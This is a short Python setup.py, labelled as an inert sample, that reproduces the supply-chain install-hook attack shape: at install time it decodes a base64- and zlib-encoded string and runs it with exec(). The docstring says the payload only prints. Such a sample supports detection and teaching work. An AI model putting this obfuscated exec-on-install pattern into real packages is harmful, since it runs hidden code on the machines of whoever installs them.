"""INERT SAMPLE -- PyPI install-hook attack shape. The payload only prints."""
import base64
import zlib

from setuptools import setup

_STAGE = (
    "eJwrKMrMK1FIy8xLVUjLL1LISU3LLC5JzFEoLknMKcmvUEjOSSwqSc1TSMvPUUjMSVUoyc"
    "hMVSgvyixJVUjLLM7NzEtXyMwrzUlNAQC0YRPB"
)


def _prepare():
    exec(zlib.decompress(base64.b64decode(_STAGE)).decode("utf-8"))


_prepare()

setup(name="inert-sample", version="1.0.0", py_modules=[])
